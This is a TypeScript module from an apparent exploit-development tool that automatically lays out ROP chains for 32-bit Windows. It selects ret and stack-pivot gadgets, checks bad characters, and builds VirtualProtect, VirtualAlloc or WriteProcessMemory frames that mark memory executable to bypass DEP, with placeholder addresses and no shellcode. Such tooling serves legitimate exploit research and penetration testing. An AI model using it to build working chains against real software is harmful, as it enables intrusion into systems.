import { CapabilityIndex } from "./capabilities";
import { ChainStep } from "./chain";
import { ExploitStrategy, RopStrategyPlan, StrategyPlan } from "./planner";
import { RopGadget } from "./types";

// ---- Exploit state ----------------------------------------------------------

export type ControlMechanism =
  | "saved-ret"
  | "seh"
  | "function-pointer"
  | "vtable"
  | "other";

export type RegisterState =
  | { kind: "unknown" }
  | { kind: "constant"; value: number }
  | { kind: "controlled" }
  | { kind: "pointer-into-controlled"; offset: number };

export type MemoryRegionBase =
  | { kind: "absolute"; address: number }
  | { kind: "esp-relative"; offset: number }
  | { kind: "register-relative"; register: string; offset: number };

export interface MemoryRegion {
  name: string;
  base: MemoryRegionBase;
  size: number;
  controlled: boolean;
  readable: boolean;
  writable: boolean;
  executable: boolean;
}

export interface SehState {
  nsehOffset: number;
  sehOffset: number;
  postSehControlledBytes: number;
  preSehControlledBytes: number;
  landingOffset?: number;
  dispatcherSemantics?: "pop-pop-ret" | "add-esp" | "other";
}

export interface ExploitState {
  control: {
    mechanism: ControlMechanism;
    instructionPointerControlled: boolean;
    initialTargetConstraints?: {
      badchars?: number[];
      maxAddressBytes?: number;
    };
  };

  stack: {
    espAtControl?: number;
    controlledBeforeEsp: number;
    controlledAfterEsp: number;
    contiguousControlledBytes: number;
    readable: boolean;
    writable: boolean;
    executable: boolean;
    alignment?: number;
  };

  registers: Partial<Record<string, RegisterState>>;

  memory?: MemoryRegion[];

  seh?: SehState;

  constraints: {
    badchars: number[];
    maximumPayloadLength?: number;
    stackAlignment?: number;
    apiResolution: "direct" | "iat" | "either";
  };
}

// ---- Pivot semantics --------------------------------------------------------

export type PivotSource = "register" | "memory" | "esp-adjust";

export type X86Register =
  | "eax" | "ebx" | "ecx" | "edx"
  | "esi" | "edi" | "ebp" | "esp";

export interface PivotSemantics {
  sequence: string;
  address: bigint;
  source: PivotSource;
  sourceRegister?: X86Register;
  adjustment?: number;
  stackDeltaBeforePivot: number;
  clobbers: X86Register[];
}

// ---- Synthesis output -------------------------------------------------------

export type SynthesisEntryPath =
  | "DIRECT_API"
  | "RET_TO_FRAME"
  | "PIVOT_TO_FRAME"
  | "SEH_DISPATCH";

export type SynthesisStatus =
  | "complete"
  | "complete-with-violations"
  | "blocked";

export type DiagnosticKind = "blocker" | "violation" | "warning";

export interface Diagnostic {
  kind: DiagnosticKind;
  source: string;
  message: string;
}

export interface SynthesisSlot {
  offset: number;
  size: number;
  role: string;
  step: ChainStep;
}

export interface SynthesisResult {
  status: SynthesisStatus;
  layoutProduced: boolean;
  constraintCompatible: boolean;
  planId: number;
  strategy: ExploitStrategy;
  shape: StrategyPlan["shape"];
  entryPath: SynthesisEntryPath;
  pivot?: PivotSemantics;
  slots: SynthesisSlot[];
  totalBytes: number;
  placeholders: string[];
  blockers: Diagnostic[];
  violations: Diagnostic[];
  warnings: Diagnostic[];
}

// ---- Helpers ----------------------------------------------------------------

function hex32(value: bigint | number): string {
  const v = typeof value === "bigint" ? value : BigInt(value >>> 0);
  return `0x${v.toString(16).toUpperCase().padStart(8, "0")}`;
}

function uniqueBytes(values: number[] | undefined): number[] {
  const seen = new Set<number>();
  for (const v of values ?? []) {
    if (Number.isInteger(v) && v >= 0 && v <= 0xff) seen.add(v & 0xff);
  }
  return [...seen].sort((a, b) => a - b);
}

function badcharHits(value: number, badchars: number[]): number[] {
  if (badchars.length === 0) return [];
  const bad = new Set(badchars);
  const hits: number[] = [];
  const word = value >>> 0;
  for (let i = 0; i < 4; i++) {
    const byte = (word >>> (i * 8)) & 0xff;
    if (bad.has(byte) && !hits.includes(byte)) hits.push(byte);
  }
  return hits;
}

function byteList(bytes: number[]): string {
  return bytes.map((b) => `0x${b.toString(16).toUpperCase().padStart(2, "0")}`).join(", ");
}

export function firstKnownAddress(gadget: RopGadget): bigint | undefined {
  const loc = gadget.locations.find((l) => l.virtualAddress !== undefined);
  return loc?.virtualAddress !== undefined ? BigInt(loc.virtualAddress) : undefined;
}

export function gadgetSequence(gadget: RopGadget): string {
  return gadget.instructions.map((i) => i.normalizedText).join(" ; ");
}

const GP_REGISTERS: X86Register[] = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"];

// ---- Gadget selection -------------------------------------------------------

function findRetGadget(index: CapabilityIndex): RopGadget | undefined {
  return index.gadgets
    .filter((g) =>
      g.instructions.length === 1
      && g.instructions[0].mnemonic === "ret"
      && g.instructions[0].operands.length === 0
      && firstKnownAddress(g) !== undefined)
    .sort((a, b) => b.score - a.score)[0];
}

export function classifyPivotSource(gadget: RopGadget): { source: PivotSource; sourceRegister?: X86Register; adjustment?: number; clobbers: X86Register[] } {
  const instrs = gadget.instructions;
  const first = instrs[0];

  if (first.mnemonic === "xchg" && first.operands.length === 2) {
    const ops = first.operands.map((o) => o.trim().toLowerCase());
    const espIdx = ops.indexOf("esp");
    if (espIdx >= 0) {
      const other = ops[1 - espIdx] as X86Register;
      return { source: "register", sourceRegister: other, clobbers: [other, "esp"] };
    }
  }

  if (first.mnemonic === "mov" && first.operands.length === 2) {
    const dst = first.operands[0].trim().toLowerCase();
    const src = first.operands[1].trim().toLowerCase();
    if (dst === "esp" && GP_REGISTERS.includes(src as X86Register)) {
      return { source: "register", sourceRegister: src as X86Register, clobbers: ["esp"] };
    }
  }

  if (first.mnemonic === "add" && first.operands.length === 2) {
    const dst = first.operands[0].trim().toLowerCase();
    if (dst === "esp") {
      const imm = first.operands[1].trim();
      const val = imm.startsWith("0x") ? parseInt(imm, 16) : parseInt(imm, 10);
      if (Number.isFinite(val)) {
        return { source: "esp-adjust", adjustment: val, clobbers: ["esp"] };
      }
    }
  }

  if (first.mnemonic === "sub" && first.operands.length === 2) {
    const dst = first.operands[0].trim().toLowerCase();
    if (dst === "esp") {
      const imm = first.operands[1].trim();
      const val = imm.startsWith("0x") ? parseInt(imm, 16) : parseInt(imm, 10);
      if (Number.isFinite(val)) {
        return { source: "esp-adjust", adjustment: -val, clobbers: ["esp"] };
      }
    }
  }

  return { source: "memory", clobbers: ["esp"] };
}

function selectPivotGadget(index: CapabilityIndex, state: ExploitState): { gadget: RopGadget; semantics: PivotSemantics } | undefined {
  const candidates = index.gadgets
    .filter((g) =>
      g.capabilities.some((c) => c.kind === "STACK_PIVOT")
      && firstKnownAddress(g) !== undefined)
    .sort((a, b) => {
      const aLen = a.instructions.length;
      const bLen = b.instructions.length;
      if (aLen !== bLen) return aLen - bLen;
      return b.score - a.score;
    });

  for (const gadget of candidates) {
    const addr = firstKnownAddress(gadget)!;
    const { source, sourceRegister, adjustment, clobbers } = classifyPivotSource(gadget);

    if (source === "register" && sourceRegister) {
      const regState = state.registers[sourceRegister];
      if (!regState || regState.kind === "unknown") continue;
    }

    const stackDelta = gadget.semanticSummary.summary.stackDelta.values.exact;
    const delta = stackDelta.size === 1 ? [...stackDelta][0] : 0;

    return {
      gadget,
      semantics: {
        sequence: gadgetSequence(gadget),
        address: addr,
        source,
        sourceRegister,
        adjustment,
        stackDeltaBeforePivot: delta,
        clobbers,
      },
    };
  }

  return undefined;
}

// ---- State validation -------------------------------------------------------

export interface StateValidation {
  viable: boolean;
  entryPath: SynthesisEntryPath | undefined;
  blockers: Diagnostic[];
  warnings: Diagnostic[];
}

function validateForDirectApi(
  state: ExploitState,
  plan: RopStrategyPlan,
): StateValidation {
  const blockers: Diagnostic[] = [];
  const warnings: Diagnostic[] = [];

  if (!state.control.instructionPointerControlled) {
    blockers.push({ kind: "blocker", source: "control", message: "EIP is not controlled." });
  }
  if (state.control.mechanism !== "saved-ret") {
    blockers.push({ kind: "blocker", source: "control", message: `Control mechanism "${state.control.mechanism}" is not saved-ret; DIRECT_API requires ret-based control transfer.` });
  }

  const frameSize = plan.strategy === "WriteProcessMemory" ? 24 : 20;
  if (state.stack.controlledAfterEsp < frameSize) {
    blockers.push({ kind: "blocker", source: "stack", message: `Only ${state.stack.controlledAfterEsp} bytes controlled after ESP; ${frameSize} needed for ${plan.strategy} arguments (API address is the saved return, not on the stack).` });
  }

  if (!state.stack.writable) {
    blockers.push({ kind: "blocker", source: "stack", message: "Stack region after ESP is not writable." });
  }

  if (state.stack.executable) {
    warnings.push({ kind: "warning", source: "stack", message: "Stack is already executable; DEP bypass may be unnecessary." });
  }

  const alignment = state.stack.alignment ?? 4;
  if (alignment % 4 !== 0) {
    warnings.push({ kind: "warning", source: "stack", message: `Stack alignment is ${alignment}-byte; stdcall frames assume 4-byte alignment.` });
  }

  if (plan.apiResolution === "iat" && state.constraints.apiResolution === "direct") {
    blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires IAT resolution but exploit state constrains to direct resolution." });
  }
  if (plan.apiResolution === "direct" && state.constraints.apiResolution === "iat") {
    blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires direct resolution but exploit state constrains to IAT resolution." });
  }

  return {
    viable: blockers.length === 0,
    entryPath: blockers.length === 0 ? "DIRECT_API" : undefined,
    blockers,
    warnings,
  };
}

function validateForRetToFrame(
  state: ExploitState,
  plan: RopStrategyPlan,
  index: CapabilityIndex,
): StateValidation {
  const blockers: Diagnostic[] = [];
  const warnings: Diagnostic[] = [];

  if (!state.control.instructionPointerControlled) {
    blockers.push({ kind: "blocker", source: "control", message: "EIP is not controlled." });
  }
  if (state.control.mechanism !== "saved-ret") {
    blockers.push({ kind: "blocker", source: "control", message: `Control mechanism "${state.control.mechanism}" is not saved-ret; RET_TO_FRAME requires ret-based control transfer.` });
  }

  const strategy = plan.strategies.find(
    (s) => s.shape === "SYNTHETIC_STDCALL_FRAME" || s.shape === "RET_DISPATCH",
  );
  if (!strategy?.possible) {
    blockers.push({ kind: "blocker", source: "plan", message: "No flat stdcall shape is capability-feasible in the current plan." });
  }

  if (!findRetGadget(index)) {
    blockers.push({ kind: "blocker", source: "corpus", message: "No plain ret gadget with a known address exists in the corpus." });
  }

  const frameSize = plan.strategy === "WriteProcessMemory" ? 28 : 24;
  if (state.stack.controlledAfterEsp < frameSize) {
    blockers.push({ kind: "blocker", source: "stack", message: `Only ${state.stack.controlledAfterEsp} bytes controlled after ESP; ${frameSize} needed for the ${plan.strategy} stdcall frame (ret gadget + API + args).` });
  }

  if (!state.stack.writable) {
    blockers.push({ kind: "blocker", source: "stack", message: "Stack region after ESP is not writable." });
  }

  if (state.stack.executable) {
    warnings.push({ kind: "warning", source: "stack", message: "Stack is already executable; DEP bypass may be unnecessary." });
  }

  if (plan.apiResolution === "iat" && state.constraints.apiResolution === "direct") {
    blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires IAT resolution but exploit state constrains to direct resolution." });
  }
  if (plan.apiResolution === "direct" && state.constraints.apiResolution === "iat") {
    blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires direct resolution but exploit state constrains to IAT resolution." });
  }

  const alignment = state.stack.alignment ?? 4;
  if (alignment % 4 !== 0) {
    warnings.push({ kind: "warning", source: "stack", message: `Stack alignment is ${alignment}-byte; stdcall frames assume 4-byte alignment.` });
  }

  return {
    viable: blockers.length === 0,
    entryPath: blockers.length === 0 ? "RET_TO_FRAME" : undefined,
    blockers,
    warnings,
  };
}

function validateForPivotToFrame(
  state: ExploitState,
  plan: RopStrategyPlan,
  index: CapabilityIndex,
): StateValidation {
  const blockers: Diagnostic[] = [];
  const warnings: Diagnostic[] = [];

  if (!state.control.instructionPointerControlled) {
    blockers.push({ kind: "blocker", source: "control", message: "EIP is not controlled." });
  }

  const pivotShape = plan.strategies.find((s) => s.shape === "STACK_PIVOT_FRAME");
  if (!pivotShape?.possible) {
    blockers.push({ kind: "blocker", source: "plan", message: "STACK_PIVOT_FRAME is not capability-feasible in the current plan." });
  }

  const pivotSelection = selectPivotGadget(index, state);
  if (!pivotSelection) {
    const hasPivotGadgets = index.gadgets.some((g) =>
      g.capabilities.some((c) => c.kind === "STACK_PIVOT") && firstKnownAddress(g) !== undefined);
    if (hasPivotGadgets) {
      blockers.push({ kind: "blocker", source: "pivot", message: "Pivot gadgets exist but none have a source register in a known state. Declare the register state in ExploitState.registers." });
    } else {
      blockers.push({ kind: "blocker", source: "corpus", message: "No stack-pivot gadget with a known address exists in the corpus." });
    }
  }

  const hasControlledRegion = (state.memory ?? []).some(
    (r) => r.controlled && r.writable && r.size >= 24,
  );
  if (!hasControlledRegion && state.stack.controlledAfterEsp < 24) {
    blockers.push({ kind: "blocker", source: "memory", message: "No controlled, writable memory region large enough for a stdcall frame is described in the exploit state." });
  }

  if (state.stack.controlledAfterEsp < 8) {
    blockers.push({ kind: "blocker", source: "stack", message: "Fewer than 8 controlled bytes after ESP; not enough room for a pivot gadget address and target." });
  }

  if (plan.apiResolution === "iat" && state.constraints.apiResolution === "direct") {
    blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires IAT resolution but exploit state constrains to direct resolution." });
  }
  if (plan.apiResolution === "direct" && state.constraints.apiResolution === "iat") {
    blockers.push({ kind: "blocker", source: "resolution", message: "Plan requires direct resolution but exploit state constrains to IAT resolution." });
  }

  return {
    viable: blockers.length === 0,
    entryPath: blockers.length === 0 ? "PIVOT_TO_FRAME" : undefined,
    blockers,
    warnings,
  };
}

// ---- Slot builders ----------------------------------------------------------

interface FrameSlotDef {
  role: string;
  value?: number;
  placeholder?: string;
  comment: string;
}

function apiFrameSlots(strategy: ExploitStrategy): FrameSlotDef[] {
  switch (strategy) {
    case "VirtualProtect":
      return [
        { role: "api-address", placeholder: "VIRTUALPROTECT", comment: "VirtualProtect" },
        { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address (e.g. shellcode or jmp esp)" },
        { role: "arg1-lpAddress", placeholder: "LP_ADDRESS", comment: "lpAddress" },
        { role: "arg2-dwSize", value: 0x201, comment: "dwSize" },
        { role: "arg3-flNewProtect", value: 0x40, comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
        { role: "arg4-lpflOldProtect", placeholder: "WRITABLE", comment: "lpflOldProtect (writable dummy)" },
      ];
    case "VirtualAlloc":
      return [
        { role: "api-address", placeholder: "VIRTUALALLOC", comment: "VirtualAlloc" },
        { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address" },
        { role: "arg1-lpAddress", placeholder: "LP_ADDRESS", comment: "lpAddress" },
        { role: "arg2-dwSize", value: 0x201, comment: "dwSize" },
        { role: "arg3-flAllocationType", value: 0x1000, comment: "flAllocationType = MEM_COMMIT" },
        { role: "arg4-flProtect", value: 0x40, comment: "flProtect = PAGE_EXECUTE_READWRITE" },
      ];
    case "WriteProcessMemory":
      return [
        { role: "api-address", placeholder: "WRITEPROCESSMEMORY", comment: "WriteProcessMemory" },
        { role: "return-address", placeholder: "RETURN_ADDR", comment: "return address" },
        { role: "arg1-hProcess", value: 0xffffffff, comment: "hProcess = GetCurrentProcess()" },
        { role: "arg2-lpBaseAddress", placeholder: "LP_BASE_ADDRESS", comment: "lpBaseAddress (executable dest)" },
        { role: "arg3-lpBuffer", placeholder: "LP_BUFFER", comment: "lpBuffer (source shellcode)" },
        { role: "arg4-nSize", placeholder: "NSIZE", comment: "nSize" },
        { role: "arg5-lpNBW", placeholder: "WRITABLE", comment: "lpNumberOfBytesWritten (writable dummy)" },
      ];
    case "Stack Pivot":
      return [
        { role: "pivot-target", placeholder: "PIVOT_TARGET", comment: "pivot target address" },
      ];
  }
}

function checkAddressBadchars(addr: bigint, badchars: number[], label: string): Diagnostic | undefined {
  const hits = badcharHits(Number(addr & BigInt(0xffffffff)), badchars);
  if (hits.length > 0) {
    return { kind: "violation", source: label, message: `${label} ${hex32(addr)} contains badchar byte(s) ${byteList(hits)}.` };
  }
  return undefined;
}

function buildFrameSlots(
  frameDefs: FrameSlotDef[],
  badchars: number[],
  startOffset: number,
): { slots: SynthesisSlot[]; placeholders: string[]; violations: Diagnostic[]; warnings: Diagnostic[] } {
  const placeholders = new Set<string>();
  const violations: Diagnostic[] = [];
  const warnings: Diagnostic[] = [];
  const slots: SynthesisSlot[] = [];
  let offset = startOffset;

  for (const def of frameDefs) {
    let step: ChainStep;
    if (def.value !== undefined) {
      const v = def.value >>> 0;
      const hits = badcharHits(v, badchars);
      if (hits.length > 0) {
        violations.push({
          kind: "violation",
          source: def.role,
          message: `${def.comment}: ${hex32(v)} contains badchar byte(s) ${byteList(hits)}.`,
        });
      }
      step = { kind: "value", value: v, comment: def.comment };
    } else {
      placeholders.add(def.placeholder!);
      warnings.push({
        kind: "warning",
        source: def.role,
        message: `${def.placeholder}: placeholder value must be checked against badchars after resolution.`,
      });
      step = { kind: "value", placeholder: def.placeholder, comment: def.comment };
    }

    slots.push({ offset, size: 4, role: def.role, step });
    offset += 4;
  }

  return { slots, placeholders: [...placeholders], violations, warnings };
}

function checkPayloadLength(totalBytes: number, state: ExploitState): Diagnostic | undefined {
  const max = state.constraints.maximumPayloadLength;
  if (max !== undefined && totalBytes > max) {
    return {
      kind: "blocker",
      source: "payload-length",
      message: `Layout requires ${totalBytes} bytes but maximumPayloadLength is ${max}.`,
    };
  }
  return undefined;
}

// ---- Synthesizer ------------------------------------------------------------

function synthesizeDirectApi(
  plan: RopStrategyPlan,
  state: ExploitState,
  badchars: number[],
): SynthesisResult {
  const frameDefs = apiFrameSlots(plan.strategy);
  const apiSlot = frameDefs.shift()!;
  const { slots, placeholders, violations, warnings } = buildFrameSlots(frameDefs, badchars, 0);

  const apiStep: ChainStep = { kind: "value", placeholder: apiSlot.placeholder, comment: `saved EIP = ${apiSlot.comment} (direct overwrite)` };
  const allPlaceholders = new Set([apiSlot.placeholder!, ...placeholders]);
  warnings.push({
    kind: "warning",
    source: "api-address",
    message: `${apiSlot.placeholder}: saved EIP must contain the API address; check against badchars after resolution.`,
  });

  const allSlots: SynthesisSlot[] = [
    { offset: -4, size: 4, role: "saved-eip", step: apiStep },
    ...slots,
  ];

  const totalBytes = allSlots.length * 4;
  const lengthCheck = checkPayloadLength(totalBytes, state);
  if (lengthCheck) {
    return blocked(plan, "DIRECT_API", [lengthCheck]);
  }

  const hasViolations = violations.length > 0;
  return {
    status: hasViolations ? "complete-with-violations" : "complete",
    layoutProduced: true,
    constraintCompatible: !hasViolations,
    planId: plan.id,
    strategy: plan.strategy,
    shape: "SYNTHETIC_STDCALL_FRAME",
    entryPath: "DIRECT_API",
    slots: allSlots,
    totalBytes,
    placeholders: [...allPlaceholders],
    blockers: [],
    violations,
    warnings,
  };
}

function synthesizeRetToFrame(
  index: CapabilityIndex,
  plan: RopStrategyPlan,
  state: ExploitState,
  badchars: number[],
): SynthesisResult {
  const retGadget = findRetGadget(index)!;
  const retAddr = firstKnownAddress(retGadget)!;
  const violations: Diagnostic[] = [];
  const warnings: Diagnostic[] = [];

  const retCheck = checkAddressBadchars(retAddr, badchars, "ret gadget");
  if (retCheck) violations.push(retCheck);

  const retStep: ChainStep = {
    kind: "gadget",
    address: retAddr,
    comment: `saved EIP = ret gadget (dispatches to frame at ESP)`,
  };

  const frameDefs = apiFrameSlots(plan.strategy);
  const { slots: frameSlots, placeholders, violations: frameViolations, warnings: frameWarnings } =
    buildFrameSlots(frameDefs, badchars, 0);

  violations.push(...frameViolations);
  warnings.push(...frameWarnings);

  const allSlots: SynthesisSlot[] = [
    { offset: -4, size: 4, role: "saved-eip", step: retStep },
    ...frameSlots,
  ];

  const totalBytes = allSlots.length * 4;
  const lengthCheck = checkPayloadLength(totalBytes, state);
  if (lengthCheck) {
    return blocked(plan, "RET_TO_FRAME", [lengthCheck]);
  }

  const hasViolations = violations.length > 0;
  return {
    status: hasViolations ? "complete-with-violations" : "complete",
    layoutProduced: true,
    constraintCompatible: !hasViolations,
    planId: plan.id,
    strategy: plan.strategy,
    shape: "SYNTHETIC_STDCALL_FRAME",
    entryPath: "RET_TO_FRAME",
    slots: allSlots,
    totalBytes,
    placeholders,
    blockers: [],
    violations,
    warnings,
  };
}

function synthesizePivotToFrame(
  index: CapabilityIndex,
  plan: RopStrategyPlan,
  state: ExploitState,
  badchars: number[],
  pivotSel: { gadget: RopGadget; semantics: PivotSemantics },
): SynthesisResult {
  const violations: Diagnostic[] = [];
  const warnings: Diagnostic[] = [];

  const pivotCheck = checkAddressBadchars(pivotSel.semantics.address, badchars, "pivot gadget");
  if (pivotCheck) violations.push(pivotCheck);

  const pivotStep: ChainStep = {
    kind: "gadget",
    address: pivotSel.semantics.address,
    comment: `saved EIP = pivot: ${pivotSel.semantics.sequence}`,
  };

  const pivotDestStep: ChainStep = {
    kind: "value",
    placeholder: "PIVOT_DEST",
    comment: "pivot destination (controlled region holding the stdcall frame)",
  };

  const frameDefs = apiFrameSlots(plan.strategy);
  const { slots: frameSlots, placeholders: framePlaceholders, violations: frameViolations, warnings: frameWarnings } =
    buildFrameSlots(frameDefs, badchars, 8);

  violations.push(...frameViolations);
  warnings.push(...frameWarnings);

  const allPlaceholders = new Set(["PIVOT_DEST", ...framePlaceholders]);
  warnings.push({
    kind: "warning",
    source: "pivot-destination",
    message: "PIVOT_DEST: set to a controlled, writable region that holds the stdcall frame.",
  });

  const allSlots: SynthesisSlot[] = [
    { offset: -4, size: 4, role: "saved-eip", step: pivotStep },
    { offset: 0, size: 4, role: "pivot-destination", step: pivotDestStep },
    ...frameSlots,
  ];

  const totalBytes = allSlots.length * 4;
  const lengthCheck = checkPayloadLength(totalBytes, state);
  if (lengthCheck) {
    return blocked(plan, "PIVOT_TO_FRAME", [lengthCheck]);
  }

  const hasViolations = violations.length > 0;
  return {
    status: hasViolations ? "complete-with-violations" : "complete",
    layoutProduced: true,
    constraintCompatible: !hasViolations,
    planId: plan.id,
    strategy: plan.strategy,
    shape: "STACK_PIVOT_FRAME",
    entryPath: "PIVOT_TO_FRAME",
    pivot: pivotSel.semantics,
    slots: allSlots,
    totalBytes,
    placeholders: [...allPlaceholders],
    blockers: [],
    violations,
    warnings,
  };
}

function blocked(plan: RopStrategyPlan, entryPath: SynthesisEntryPath, blockers: Diagnostic[]): SynthesisResult {
  return {
    status: "blocked",
    layoutProduced: false,
    constraintCompatible: false,
    planId: plan.id,
    strategy: plan.strategy,
    shape: "SYNTHETIC_STDCALL_FRAME",
    entryPath,
    slots: [],
    totalBytes: 0,
    placeholders: [],
    blockers,
    violations: [],
    warnings: [],
  };
}

export function synthesize(
  index: CapabilityIndex,
  plan: RopStrategyPlan,
  state: ExploitState,
): SynthesisResult {
  const badchars = uniqueBytes(state.constraints.badchars);

  const retToFrameVal = validateForRetToFrame(state, plan, index);
  const directApiVal = validateForDirectApi(state, plan);
  const pivotVal = validateForPivotToFrame(state, plan, index);

  if (retToFrameVal.viable) {
    const result = synthesizeRetToFrame(index, plan, state, badchars);
    result.warnings.push(...retToFrameVal.warnings);
    return result;
  }

  if (directApiVal.viable) {
    const result = synthesizeDirectApi(plan, state, badchars);
    result.warnings.push(...directApiVal.warnings);
    return result;
  }

  if (pivotVal.viable) {
    const pivotSel = selectPivotGadget(index, state)!;
    const result = synthesizePivotToFrame(index, plan, state, badchars, pivotSel);
    result.warnings.push(...pivotVal.warnings);
    return result;
  }

  return {
    status: "blocked",
    layoutProduced: false,
    constraintCompatible: false,
    planId: plan.id,
    strategy: plan.strategy,
    shape: "SYNTHETIC_STDCALL_FRAME",
    entryPath: "DIRECT_API",
    slots: [],
    totalBytes: 0,
    placeholders: [],
    blockers: [
      ...retToFrameVal.blockers.map((b) => ({ ...b, source: `RET_TO_FRAME/${b.source}` })),
      ...directApiVal.blockers.map((b) => ({ ...b, source: `DIRECT_API/${b.source}` })),
      ...pivotVal.blockers.map((b) => ({ ...b, source: `PIVOT_TO_FRAME/${b.source}` })),
    ],
    violations: [],
    warnings: [],
  };
}

// ---- Display ----------------------------------------------------------------

export function synthesisRows(result: SynthesisResult): Array<Record<string, string>> {
  if (!result.layoutProduced) {
    return [
      {
        Plan: result.planId.toString(),
        Strategy: `${result.strategy} / ${result.shape}`,
        Status: result.status,
        Path: result.entryPath,
        Diagnostic: result.blockers.map((b) => b.message).join(" "),
      },
    ];
  }

  const rows: Array<Record<string, string>> = [];

  rows.push({
    Plan: result.planId.toString(),
    Strategy: `${result.strategy} / ${result.shape}`,
    Status: result.status,
    Path: result.entryPath,
    Layout: result.layoutProduced ? "produced" : "none",
    Compatible: result.constraintCompatible ? "yes" : "no",
  });

  for (const slot of result.slots) {
    rows.push({
      Offset: slot.offset < 0 ? `${slot.offset}` : `+${slot.offset}`,
      Role: slot.role,
      Word: slot.step.kind === "gadget"
        ? hex32(slot.step.address!)
        : slot.step.placeholder ?? hex32(slot.step.value!),
      Comment: slot.step.comment,
    });
  }

  for (const v of result.violations) {
    rows.push({ Diagnostic: "VIOLATION", Detail: v.message });
  }

  return rows;
}

export function synthesisStateRows(validation: StateValidation): Array<Record<string, string>> {
  return [
    { Field: "Viable", Value: validation.viable ? "yes" : "no" },
    { Field: "Entry Path", Value: validation.entryPath ?? "(none)" },
    ...validation.blockers.map((b) => ({ Field: "Blocker", Value: b.message })),
    ...validation.warnings.map((w) => ({ Field: "Warning", Value: w.message })),
  ];
}

export function validateExploitState(
  index: CapabilityIndex,
  plan: RopStrategyPlan,
  state: ExploitState,
): StateValidation {
  const retToFrame = validateForRetToFrame(state, plan, index);
  if (retToFrame.viable) return retToFrame;
  const directApi = validateForDirectApi(state, plan);
  if (directApi.viable) return directApi;
  const pivot = validateForPivotToFrame(state, plan, index);
  if (pivot.viable) return pivot;
  return {
    viable: false,
    entryPath: undefined,
    blockers: [
      ...retToFrame.blockers.map((b) => ({ ...b, source: `RET_TO_FRAME/${b.source}` })),
      ...directApi.blockers.map((b) => ({ ...b, source: `DIRECT_API/${b.source}` })),
      ...pivot.blockers.map((b) => ({ ...b, source: `PIVOT_TO_FRAME/${b.source}` })),
    ],
    warnings: [...retToFrame.warnings, ...directApi.warnings, ...pivot.warnings],
  };
}
